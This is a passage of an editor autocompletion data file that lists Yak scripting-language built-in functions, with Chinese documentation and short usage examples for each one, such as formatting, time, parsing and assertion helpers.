      },
      {
        kind: 1,
        label: "yakfmt(${1:code /*type: string*/})",
        documentation:
          'yakfmt(code string) string  doc:yakfmt 格式化任意 Yak 代码，返回格式化后的代码\nExample:\n```\nyakfmt("for { println(`hello yak`) }")\n```',
        insertText: "yakfmt(${1:code /*type: string*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "waitAllAsyncCallFinish()",
        documentation:
          "waitAllAsyncCallFinish()  doc:waitAllAsyncCallFinish 等待直到所有异步调用完成\nExample:\n```\na = 0\nfor i in 5 {\ngo func(i) {\ntime.sleep(i)\na++\n}(i)\n}\nwaitAllAsyncCallFinish()\nassert a == 5\n```",
        insertText: "waitAllAsyncCallFinish()",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "wait(${1:i})",
        documentation:
          'wait(i any)  doc:wait 用于等待一个上下文完成，或者让当前协程休眠一段时间，其单位为秒\n\nExample:\n```\nctx, cancel = context.WithTimeout(context.New(), time.ParseDuration("5s")~) // 上下文在调用cancel函数或者5秒后完成\nwait(ctx) // 等待上下文完成\nwait(1.5) // 休眠1.5秒\n```\n',
        insertText: "wait(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "var",
        documentation: "var: builtin.tyVar",
        insertText: "var",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "uuid()",
        documentation:
          "uuid() string  doc:uuid 用于生成一个uuid字符串\n\nExample:\n```\nprintln(uuid())\n```\n",
        insertText: "uuid()",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "undefined",
        documentation: "undefined: *spec.undefinedType",
        insertText: "undefined",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "uint8",
        documentation: "uint8: builtin.tyUint8",
        insertText: "uint8",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "uint64",
        documentation: "uint64: builtin.tyUint64",
        insertText: "uint64",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "uint32",
        documentation: "uint32: builtin.tyUint32",
        insertText: "uint32",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "uint16",
        documentation: "uint16: builtin.tyUint16",
        insertText: "uint16",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "uint",
        documentation: "uint: builtin.tyUint",
        insertText: "uint",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "typeof(${1:i})",
        documentation:
          'typeof(i any) reflect.Type  doc:typeof 用于获取传入值的类型结构体\n\nExample:\n```\ntypeof(1) == int // true\ntypeof("hello") == string // true\n```\n',
        insertText: "typeof(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "type(${1:i})",
        documentation:
          'type(i any) reflect.Type  doc:typeof 用于获取传入值的类型结构体\n\nExample:\n```\ntypeof(1) == int // true\ntypeof("hello") == string // true\n```\n',
        insertText: "type(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "timestampToTime(${1:tValue /*type: int64*/})",
        documentation:
          "timestampToTime(tValue int64) time.Time  doc:timestampToTime 用于将时间戳转换为时间结构体\n\nExample:\n```\nprintln(timestampToDatetime(timestamp()))\n```\n",
        insertText: "timestampToTime(${1:tValue /*type: int64*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "timestampToDatetime(${1:tValue /*type: int64*/})",
        documentation:
          'timestampToDatetime(tValue int64) string  doc:timestampToDatetime 用于将时间戳转换为日期与时间，其格式为"2006-01-02 15:04:05"\n\nExample:\n```\nprintln(timestampToDatetime(timestamp()))\n```\n',
        insertText: "timestampToDatetime(${1:tValue /*type: int64*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "timestamp()",
        documentation:
          "timestamp() int64  doc:timestamp 用于获取当前时间戳，其返回值为int64类型\n\nExample:\n```\nprintln(timestamp())\n```\n",
        insertText: "timestamp()",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "tick1s(${1:f /*type: func() bool*/})",
        documentation:
          'tick1s(f func() bool)  doc:tick1s 用于每隔1秒执行一次传入的函数，直到函数返回false为止\n\nExample:\n```\ncount = 0\ntick1s(func() bool {\nprintln("hello")\ncount++\nreturn count <= 5\n})\n```\n',
        insertText: "tick1s(${1:f /*type: func() bool*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "sub(${1:a}, ${2:i}, ${3:j})",
        documentation:
          "sub(a any, i any, j any) any  doc:sub 返回数组或切片的子切片\n\n! 已弃用，可以使用切片语句代替\n\nExample:\n```\na = [1, 2, 3, 4, 5]\nb = sub(a, 1, 3) // [2, 3] 相当于 a[1:3]\n```\n",
        insertText: "sub(${1:a}, ${2:i}, ${3:j})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "string",
        documentation: "string: builtin.tyString",
        insertText: "string",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "sprintln(${1:a...})",
        documentation:
          'sprintln(a ...any) string  doc:sprintln 使用默认格式进行格式化并返回字符串（包含换行）\n\nExample:\n```\nsprintln({"a": 1, "b": 2}, 1, [1, 2, 3])\n```\n',
        insertText: "sprintln(${1:a...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "sprintf(${1:format /*type: string*/}, ${2:a...})",
        documentation:
          'sprintf(format string, a ...any) string  doc:sprintf 根据格式说明符进行格式化任意个数的参数并返回字符串\n\nExample:\n```\nsprintf("%v %d %v", {"a": 1, "b": 2}, 1, [1, 2, 3])\n```\n',
        insertText: "sprintf(${1:format /*type: string*/}, ${2:a...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "sprint(${1:a...})",
        documentation:
          'sprint(a ...any) string  doc:sprint 使用默认格式进行格式化并返回字符串\n\nExample:\n```\nsprint({"a": 1, "b": 2}, 1, [1, 2, 3])\n```\n',
        insertText: "sprint(${1:a...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "sliceOf(${1:typ})",
        documentation:
          'sliceOf(typ any) any  doc:sliceOf 返回指定类型的切片类型，可用于 mkslice 中\n\n! 已弃用，可以使用 make 语句代替\n\nExample:\n```\nm = mkslice(sliceOf("var")) // []any\n```\n',
        insertText: "sliceOf(${1:typ})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "sliceFrom(${1:args...})",
        documentation:
          "sliceFrom(args ...any) any  doc:sliceFrom 根据传入的键值对初始化切片（slice）\n\n! 已弃用，可以使用 slice 初始化语句代替\n\nExample:\n```\na = sliceFrom(1, 2, 3) // [1, 2, 3]\n```\n",
        insertText: "sliceFrom(${1:args...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "slice(${1:typ}, ${2:args...})",
        documentation:
          'slice(typ any, args ...any) any  doc:mkslice 创建指定类型的切片（slice）\n\n! 已弃用，可以使用 make 语句代替\n\nExample:\n```\na = mkslice("var") // []any\n```\n',
        insertText: "slice(${1:typ}, ${2:args...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "sleep(${1:i /*type: float64*/})",
        documentation:
          "sleep(i float64)  doc:sleep 用于让当前协程休眠一段时间，其单位为秒\n\nExample:\n```\nsleep(1.5) // 休眠1.5秒\n```\n",
        insertText: "sleep(${1:i /*type: float64*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "set(${1:m}, ${2:args...})",
        documentation:
          "set(m any, args ...any)  doc:set 设置一个对象的值，对象可以是数组(array)，切片(slice)，映射(map)或结构体(struct)或结构体引用(ptr)\n\n! 已弃用，可以使用初始化语句或赋值语句代替\n\nExample:\n```\na = make([]int, 3)\nset(a, 0, 100, 1, 200, 2, 300) // a = [100, 200, 300]\n```\n",
        insertText: "set(${1:m}, ${2:args...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "sdump(${1:i...})",
        documentation:
          'sdump(i ...any) string  doc:sdump 以用户友好的方式格式化任意类型的数据，返回格式化后的字符串\n\nExample:\n```\nprintln(sdump("hello", 1, ["1", 2, "3"]))\n```\n',
        insertText: "sdump(${1:i...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "retry(${1:i /*type: int*/}, ${2:handler /*type: func() bool*/})",
        documentation:
          "retry(i int, handler func() bool)  doc:retry 对第二个参数作为函数的情况，重试N次，如果第二个参数返回值是 true，则重试，否则就结束，如果遇到错误，停止重试\n\nExample:\n```\ncount = 0\n\n\tretry(100, () => {\n\t   defer recover()\n\n\t   count++\n\t   if count > 3 {\n\t       die(111)\n\t   }\n\t   return true\n\t})\n\nassert count == 4, f`${count}`\n\ncount = 0\n\n\tretry(100, () => {\n\t   defer recover()\n\n\t   count++\n\t   if count > 3 {\n\t       return false\n\t   }\n\t   return true\n\t})\n\nassert count == 4, f`${count}`\n\ncount = 0\n\n\tretry(100, () => {\n\t   count++\n\t})\n\nassert count == 1, f`${count}`\n\ncount = 0\n\n\tretry(100, () => {\n\t   count++\n\t   return true\n\t})\n\nassert count == 100, f`${count}`\n```\n",
        insertText:
          "retry(${1:i /*type: int*/}, ${2:handler /*type: func() bool*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "randstr(${1:length /*type: int*/})",
        documentation:
          "randstr(length int) string  doc:randstr 返回在大小写字母表中随机挑选 n 个字符组成的字符串\n\nExample:\n```\nprintln(randstr(10))\n```\n",
        insertText: "randstr(${1:length /*type: int*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "randn(${1:min /*type: int*/}, ${2:max /*type: int*/})",
        documentation:
          "randn(min int, max int) int  doc:randn 用于生成一个随机数，其范围为[min, max)\n\n如果min大于max，则会抛出异常\n\nExample:\n```\nprintln(randn(1, 100))\n```\n",
        insertText: "randn(${1:min /*type: int*/}, ${2:max /*type: int*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "println(${1:a...})",
        documentation:
          'println(a ...any) (n int, err error)  doc:println 在标准输出中使用默认格式进行格式化并打印信息（包含换行）\n\nExample:\n```\nprintln("hello world")\nprintln("hello yak")\n```\n',
        insertText: "println(${1:a...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "printf(${1:format /*type: string*/}, ${2:a...})",
        documentation:
          'printf(format string, a ...any) (n int, err error)  doc:printf 在标准输出中根据格式说明符进行格式化并打印信息\n\nExample:\n```\nprintf("hello %s", "yak")\nprintf("value = %v", value)\n```\n',
        insertText: "printf(${1:format /*type: string*/}, ${2:a...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "print(${1:a...})",
        documentation:
          'print(a ...any) (n int, err error)  doc:print 在标准输出中使用默认格式进行格式化并打印信息\n\nExample:\n```\nprint("hello yak")\nprint("hello", 1, "2", [1, 2, 3])\n```\n',
        insertText: "print(${1:a...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label:
          "parseTime(${1:layout /*type: string*/}, ${2:value /*type: string*/})",
        documentation:
          'parseTime(layout string, value string) (time.Time, error)  doc:parseTime 以一个布局解析一个格式化的时间字符串并返回它代表的时间结构体。\n\nExample:\n```\nt, err = parseTime("2006-01-02 15:04:05", "2023-11-11 11:11:11")\n```\n',
        insertText:
          "parseTime(${1:layout /*type: string*/}, ${2:value /*type: string*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "parseString(${1:i})",
        documentation:
          'parseString(i any) string  doc:parseString 尝试将传入的值转换为字符串，其实际上相当于 `sprintf("%v", i)“\n\nExample:\n```\nparseString(123) // "123"\nparseString(["1", "2", "3"]) // "[1 2 3]"\n```\n',
        insertText: "parseString(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "parseStr(${1:i})",
        documentation:
          'parseStr(i any) string  doc:parseString 尝试将传入的值转换为字符串，其实际上相当于 `sprintf("%v", i)“\n\nExample:\n```\nparseString(123) // "123"\nparseString(["1", "2", "3"]) // "[1 2 3]"\n```\n',
        insertText: "parseStr(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "parseInt(${1:s /*type: string*/}, ${2:bases...})",
        documentation:
          'parseInt(s string, bases ...int) int  doc:parseInt 尝试将传入的字符串转换为对应进制的整数，默认为十进制，如果失败则返回0\n\nExample:\n```\nparseInt("123") // 123\nparseInt("10", 16) // 16\nparseInt("abc") // 0\n```\n',
        insertText: "parseInt(${1:s /*type: string*/}, ${2:bases...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "parseFloat(${1:s /*type: string*/})",
        documentation:
          'parseFloat(s string) float64  doc:parseFloat 尝试将传入的字符串转换为浮点数，如果失败则返回0\n\nExample:\n```\nparseFloat("123.456") // 123.456\nparseFloat("abc") // 0\n```\n',
        insertText: "parseFloat(${1:s /*type: string*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "parseBoolean(${1:i})",
        documentation:
          'parseBoolean(i any) bool  doc:parseBool 尝试将传入的值转换为布尔值，如果失败则返回false\n\nExample:\n```\nparseBool("true") // true\nparseBool("false") // false\nparseBool("abc") // false\n```\n',
        insertText: "parseBoolean(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "parseBool(${1:i})",
        documentation:
          'parseBool(i any) bool  doc:parseBool 尝试将传入的值转换为布尔值，如果失败则返回false\n\nExample:\n```\nparseBool("true") // true\nparseBool("false") // false\nparseBool("abc") // false\n```\n',
        insertText: "parseBool(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "panicf(${1:format /*type: string*/}, ${2:args...})",
        documentation:
          'panicf(format string, args ...any)  doc:panicf 崩溃并根据格式化打印错误信息\n\nExample:\n```\npanicf("something happened: %v", err)\n```\n',
        insertText: "panicf(${1:format /*type: string*/}, ${2:args...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "panic(${1:v})",
        documentation:
          'panic(v any)  doc:panic 崩溃并打印错误信息\n\nExample:\n```\npanic("something happened")\n```\n',
        insertText: "panic(${1:v})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "ord(${1:i})",
        documentation:
          "ord(i any) int  doc:ord  将传入的值转换为对应的ascii码整数\n\nExample:\n```\nord(\"A\") // 65\nord('A') // 65\n```\n",
        insertText: "ord(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "now()",
        documentation:
          'now() time.Time  doc:now 用于获取当前时间的时间结构体\n\n它实际上是 time.Now 的别名\n\nExample:\n```\ndur = time.ParseDuration("1m")~\nctx, cancel = context.WithDeadline(context.New(), now().Add(dur))\n\nprintln(now().Format("2006-01-02 15:04:05"))\n```\n',
        insertText: "now()",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "nanotimestamp()",
        documentation:
          "nanotimestamp() int64  doc:nanotimestamp 用于获取当前时间戳，精确到纳秒，其返回值为int64类型\n\nExample:\n```\nprintln(nanotimestamp())\n```\n",
        insertText: "nanotimestamp()",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "mkslice(${1:typ}, ${2:args...})",
        documentation:
          'mkslice(typ any, args ...any) any  doc:mkslice 创建指定类型的切片（slice）\n\n! 已弃用，可以使用 make 语句代替\n\nExample:\n```\na = mkslice("var") // []any\n```\n',
        insertText: "mkslice(${1:typ}, ${2:args...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "mkmap(${1:typ}, ${2:n...})",
        documentation:
          'mkmap(typ any, n ...int) any  doc:mkmap 创建指定类型的映射（map）\n\n! 已弃用，可以使用 make 语句代替\n\nExample:\n```\nm = mkmap("string:var") // map[string]any\n```\n',
        insertText: "mkmap(${1:typ}, ${2:n...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "min(${1:args...})",
        documentation:
          "min(args ...any) (min any)  doc:min 返回多个值中的最小值，这只对数字类型有效\n\nExample:\n```\nmin(1,2,3,4,5) // 1\nmin(1,1.1,2.2,3.3,4.4,5.5) // 1\n```\n",
        insertText: "min(${1:args...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "max(${1:args...})",
        documentation:
          "max(args ...any) (max any)  doc:max 返回多个值中的最大值，这只对数字类型有效\n\nExample:\n```\nmax(1,2,3,4,5) // 5\nmax(1,1.1,2.2,3.3,4.4,5.5) // 5.5\n```\n",
        insertText: "max(${1:args...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "mapOf(${1:key}, ${2:val})",
        documentation:
          'mapOf(key any, val any) any  doc:mapOf 返回指定类型的映射类型，可用于 mkmap 中\n\n! 已弃用，可以使用 make 语句代替\n\nExample:\n```\nm = mkmap(mapOf("string", "var")) // map[string]any\n```\n',
        insertText: "mapOf(${1:key}, ${2:val})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "mapFrom(${1:args...})",
        documentation:
          'mapFrom(args ...any) any  doc:mapFrom 根据传入的键值对初始化映射（map）\n\n! 已弃用，可以使用 map 初始化语句代替\n\nExample:\n```\nm = mapFrom("a", 1, "b", 2) // {"a": 1, "b": 2}\n```\n',
        insertText: "mapFrom(${1:args...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "make(${1:typ /*type: yaksepc.GoTyper*/}, ${2:args...})",
        documentation:
          "make(typ yaksepc.GoTyper, args ...int) any  doc:make 创建切片（slice）, 映射（map）, 通道（chan）\n! 已弃用，可以使用 make 语句代替\n",
        insertText: "make(${1:typ /*type: yaksepc.GoTyper*/}, ${2:args...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "logrecover()",
        documentation:
          "logrecover()  doc:logrecover 用于恢复日志的显示，它用于恢复logdiscard所造成的效果\n\nExample:\n```\nlogdiscard()\nlogrecover()\n```\n",
        insertText: "logrecover()",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "logquiet()",
        documentation:
          "logquiet()  doc:logdiscard 用于丢弃所有日志，即不再显示任何日志\n\nExample:\n```\nlogdiscard()\n```\n",
        insertText: "logquiet()",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "loglevel(${1:i})",
        documentation:
          'loglevel(i any)  doc:loglevel 根据传入的字符串设置日志级别\n\ndisable: 禁用所有日志, fatal: 致命错误, error: 错误, warning: 警告, info: 信息, debug: 调试\n\nExample:\n```\nloglevel("fatal")\n```\n',
        insertText: "loglevel(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "logdiscard()",
        documentation:
          "logdiscard()  doc:logdiscard 用于丢弃所有日志，即不再显示任何日志\n\nExample:\n```\nlogdiscard()\n```\n",
        insertText: "logdiscard()",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "len(${1:a})",
        documentation:
          "len(a any) int  doc:len 返回集合对象的长度，对象可以是数组(array)，切片(slice)，映射(map)，字符串(string)或通道(channel)\n\nExample:\n```\na = [1, 2, 3]\nprintln(len(a)) // 3\n```\n",
        insertText: "len(${1:a})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "isEmpty(${1:i})",
        documentation:
          "isEmpty(i any) bool  doc:isEmpty 用于判断传入的值是否为空，如果为空则返回true，否则返回false\n\nExample:\n```\nisEmpty(nil) // true\nisEmpty(1) // false\n```\n",
        insertText: "isEmpty(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "int8",
        documentation: "int8: builtin.tyInt8",
        insertText: "int8",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "int64",
        documentation: "int64: builtin.tyInt64",
        insertText: "int64",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "int32",
        documentation: "int32: builtin.tyInt32",
        insertText: "int32",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "int16",
        documentation: "int16: builtin.tyInt16",
        insertText: "int16",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "int",
        documentation: "int: builtin.tyInt",
        insertText: "int",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "input(${1:s...})",
        documentation: "input(s ...string) string",
        insertText: "input(${1:s...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label:
          "import(${1:file /*type: string*/}, ${2:exportsName /*type: string*/})",
        documentation: "import(file string, exportsName string) (any, error)",
        insertText:
          "import(${1:file /*type: string*/}, ${2:exportsName /*type: string*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "getScopeInspects()",
        documentation:
          'getScopeInspects() ([]*ScopeValue, error)  doc:getScopeInspects 获取当前作用域中的所有变量，返回 ScopeValue 结构体引用切片\nExample:\n```\na, b = 1, "yak"\nvalues, err = getScopeInspects()\nfor v in values {\nprintln(v.Value)\n}\n```',
        insertText: "getScopeInspects()",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "getFromScope(${1:v /*type: string*/}, ${2:vals...})",
        documentation:
          'getFromScope(v string, vals ...any) any  doc:getFromScope 获取当前作用域中的变量，返回变量值\nExample:\n```\na, b = 1, "yak"\n{ assert getFromScope("a") == 1 }\n{ assert getFromScope("b") == "yak" }\n```',
        insertText: "getFromScope(${1:v /*type: string*/}, ${2:vals...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "get(${1:m}, ${2:key}, ${3:defaultValues...})",
        documentation:
          'get(m any, key any, defaultValues ...any) (result any)  doc:get 从map中获取键值，如果键不存在，则返回默认值\n\nExample:\n```\nm = {"a": 1, "b": 2}\nget(m, "a") // 1\nget(m, "c", "default") // "default"\n```\n',
        insertText: "get(${1:m}, ${2:key}, ${3:defaultValues...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "fprintln(${1:w /*type: io.Writer*/}, ${2:a...})",
        documentation:
          'fprintln(w io.Writer, a ...any) (n int, err error)  doc:fprintln 使用默认格式进行格式化任意个数的参数并写入w（包含换行）\n\nExample:\n```\nfprintln(os.Stderr, "error")\n```\n',
        insertText: "fprintln(${1:w /*type: io.Writer*/}, ${2:a...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label:
          "fprintf(${1:w /*type: io.Writer*/}, ${2:format /*type: string*/}, ${3:a...})",
        documentation:
          'fprintf(w io.Writer, format string, a ...any) (n int, err error)  doc:fprintf 根据格式说明符进行格式化任意个数的参数并写入w\n\nExample:\n```\nfprintf(os.Stderr, "value = %v", value)\n```\n',
        insertText:
          "fprintf(${1:w /*type: io.Writer*/}, ${2:format /*type: string*/}, ${3:a...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "fprint(${1:w /*type: io.Writer*/}, ${2:a...})",
        documentation:
          'fprint(w io.Writer, a ...any) (n int, err error)  doc:fprint 使用默认格式进行格式化任意个数的参数并写入w\n\nExample:\n```\nfprint(os.Stderr, "error")\n```\n',
        insertText: "fprint(${1:w /*type: io.Writer*/}, ${2:a...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "float64",
        documentation: "float64: builtin.tyFloat64",
        insertText: "float64",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "float32",
        documentation: "float32: builtin.tyFloat32",
        insertText: "float32",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "float",
        documentation: "float: builtin.tyFloat64",
        insertText: "float",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "fail(${1:msg...})",
        documentation:
          'fail(msg ...any)  doc:fail 崩溃并打印错误信息，其实际上几乎等价于panic\n\nExample:\n```\ntry{\n1/0\n} catch err {\nfail("exit code:", 1, "because:", err)\n}\n```\n',
        insertText: "fail(${1:msg...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "eval(${1:code /*type: string*/})",
        documentation:
          'eval(code string)  doc:eval 执行任意 Yak 代码\n这个函数是存在副作用的，即能够获取和改变当前引擎中的上下文\nExample:\n```\na = 1\neval("a++")\nassert a == 2\n```',
        insertText: "eval(${1:code /*type: string*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "dump(${1:i...})",
        documentation:
          'dump(i ...any)  doc:dump 以用户友好的方式格式化并打印任意类型的数据\n\nExample:\n```\ndump("hello", 1, ["1", 2, "3"])\n```\n',
        insertText: "dump(${1:i...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "die(${1:err})",
        documentation:
          "die(err any)  doc:die 判断传入的错误是否为空，如果不为空则崩溃并打印错误信息，其实际上相当于 if err != nil { panic(err) }\n\nExample:\n```\ndie(err)\n```\n",
        insertText: "die(${1:err})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "descStr(${1:i})",
        documentation:
          "descStr(i any) string  doc:descStr 以用户友好的方式打印传入的复杂值的详细信息，其往往是一个结构体或者一个结构体引用，详细信息包括可用字段，可用的成员方法，返回详细信息的字符串\n\nExample:\n```\nins = fuzz.HTTPRequest(poc.BasicRequest())~\nprintln(descStr(ins))\n```\n",
        insertText: "descStr(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "desc(${1:i})",
        documentation:
          "desc(i any)  doc:desc 以用户友好的方式打印传入的复杂值的详细信息，其往往是一个结构体或者一个结构体引用，详细信息包括可用字段，可用的成员方法\n\nExample:\n```\nins = fuzz.HTTPRequest(poc.BasicRequest())~\ndesc(ins)\n```\n",
        insertText: "desc(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "delete(${1:m}, ${2:key})",
        documentation:
          'delete(m any, key any)  doc:delete 从map中删除key\n\nExample:\n```\nm = {"a": 1, "b": 2}\ndelete(m, "b")\nprintln(m) // {"a": 1}\n```\n',
        insertText: "delete(${1:m}, ${2:key})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "datetimeToTimestamp(${1:str /*type: string*/})",
        documentation:
          'datetimeToTimestamp(str string) (int64, error)  doc:datetimeToTimestamp 用于将日期与时间字符串转换为时间戳，其格式为"2006-01-02 15:04:05"\n\nExample:\n```\nprintln(datetimeToTimestamp("2023-11-11 11:11:11")~)\n```\n',
        insertText: "datetimeToTimestamp(${1:str /*type: string*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "datetime()",
        documentation:
          'datetime() string  doc:datetime 用于获取当前日期与时间，其格式为"2006-01-02 15:04:05"\n\nExample:\n```\nprintln(datetime())\n```\n',
        insertText: "datetime()",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "date()",
        documentation:
          'date() string  doc:date 用于获取当前日期，其格式为"2006-01-02“\n\nExample:\n```\nprintln(date())\n```\n',
        insertText: "date()",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "copy(${1:dst}, ${2:src})",
        documentation:
          "copy(dst any, src any) int  doc:copy 将 src 数组/切片复制到 dst 数组/切片中，并返回复制的元素个数\n\nExample:\n```\na = [1, 2, 3]\nb = make([]int, 3)\ncopy(b, a)\nprintln(b) // [1 2 3]\n```\n",
        insertText: "copy(${1:dst}, ${2:src})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "close(${1:v})",
        documentation:
          "close(v any)  doc:close 用于关闭已经打开的通道(channel)，关闭一个已经关闭的通道会导致运行时崩溃\n\nExample:\n```\nch = make(chan int)\ngo func() {\nfor i = range ch {\nprintln(i)\n}\n}()\nch <- 1\nch <- 2\nclose(ch)\n```\n",
        insertText: "close(${1:v})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "chr(${1:i})",
        documentation:
          'chr(i any) string  doc:chr 将传入的值根据ascii码表转换为对应的字符\n\nExample:\n```\nchr(65) // A\nchr("65") // A\n```\n',
        insertText: "chr(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "cap(${1:a})",
        documentation:
          "cap(a any) int  doc:cap 返回集合对象的容量，对象可以是数组(array)，切片(slice)或通道(channel)\n\nExample:\n```\na = make([]int, 0, 3)\nprintln(cap(a)) // 3\n```\n",
        insertText: "cap(${1:a})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "byte",
        documentation: "byte: builtin.tyUint8",
        insertText: "byte",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "bool",
        documentation: "bool: builtin.tyBool",
        insertText: "bool",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "atoi(${1:s /*type: string*/})",
        documentation:
          'atoi(s string) (int, error)  doc:atoi 尝试将传入的字符串转换为整数，返回转换后的整数和错误信息\n\nExample:\n```\natoi("123") // 123, nil\natoi("abc") // 0, error\n```\n',
        insertText: "atoi(${1:s /*type: string*/})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label:
          "assertf(${1:b /*type: bool*/}, ${2:f /*type: string*/}, ${3:items...})",
        documentation:
          'assertf(b bool, f string, items ...any)  doc:assertf 用于判断传入的布尔值是否为真，如果为假则崩溃并打印错误信息\n\n! 已弃用，可以使用 assert 语句代替\n\nExample:\n```\nassertf(code == 200, "code != %d", 200) // 如果code不等于200则会崩溃并打印错误信息\n// 其相当于 assert code == 200, sprintf("code != %d", 200)\n```\n',
        insertText:
          "assertf(${1:b /*type: bool*/}, ${2:f /*type: string*/}, ${3:items...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "assertTrue(${1:b /*type: bool*/}, ${2:reason...})",
        documentation:
          'assertTrue(b bool, reason ...any)  doc:assert 用于判断传入的布尔值是否为真，如果为假则崩溃并打印错误信息\n\n! 已弃用，可以使用 assert 语句代替\n\nExample:\n```\nassert(code == 200, "code != 200") // 如果code不等于200则会崩溃并打印错误信息\n// 其相当于 assert code == 200, "code != 200"\n```\n',
        insertText: "assertTrue(${1:b /*type: bool*/}, ${2:reason...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "assertEmpty(${1:i})",
        documentation:
          'assertEmpty(i any)  doc:assertEmpty 用于判断传入的值是否为空，如果为空则崩溃并打印错误信息\n\n! 已弃用，可以使用 assert 语句代替\n\nExample:\n```\nassertEmpty(nil, "nil is not empty") // 如果nil不为空则会崩溃并打印错误信息，这里不会崩溃\n```\n',
        insertText: "assertEmpty(${1:i})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "assert(${1:b /*type: bool*/}, ${2:reason...})",
        documentation:
